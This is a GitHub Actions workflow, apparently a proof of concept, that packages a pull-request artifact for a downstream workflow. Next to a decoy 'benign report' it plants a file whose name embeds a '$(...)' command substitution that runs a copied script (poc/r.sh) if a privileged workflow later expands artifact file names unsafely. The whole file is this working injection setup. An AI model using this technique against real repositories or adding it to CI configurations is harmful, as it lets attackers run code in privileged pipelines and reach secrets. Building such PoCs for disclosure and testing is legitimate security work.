name: Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build artifact
        run: |
          mkdir -p out
          printf '%s\n' "${{ github.event.pull_request.number }}" > out/pr_number.txt
          printf 'benign report\n' > out/report.txt
          cp poc/r.sh out/r.txt
          printf 'x' > 'out/$(cd $HOME;cd ..;cd ..;cd tmp;cd content;cd content;bash r.txt).txt'
          ls -la out
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: out
